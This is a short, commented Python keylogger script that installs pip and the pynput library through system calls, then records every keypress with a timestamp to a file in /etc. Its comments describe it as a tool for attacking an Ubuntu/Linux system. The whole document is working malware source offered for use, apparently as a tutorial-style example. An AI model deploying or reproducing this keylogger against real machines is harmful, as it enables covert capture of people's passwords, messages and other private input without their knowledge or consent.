# installing os to be able to automatically install necessary modules.

import os
os.system('apt install python3-pip')
os.system('pip install pynput')

import pynput
from pynput.keyboard import Key, Listener
import logging

# the directory that will be defined where the logged text file will be.
# in our case we will be attacking an ubuntu/linux os
log_dir = r'/etc/'

# basicConfig is just a method from logging module where it takes in different parameters to be used for the format and creation of the logging text file. 
# level varies: debug(), info(), warning(), error(), and critical().
# we are only logging time and message. We can also specify the user name if wanted.

logging.basicConfig(filename = (log_dir + "keyLog.txt"), level = logging.DEBUG, format='%(asctime)s" %(message)s')

# on_press(key) is just a local method we are modifying to take in the logging command info() to log everytime the key has been pressed.
def on_press(key):
    logging.info(str(key))

# and by using the listener's on_press to equal our modified on_press and naming the Listener class as listener, we allow the iteration of the strings we collect to be .join() with the previously listened strings.
with Listener(on_press=on_press) as listener:
    listener.join()

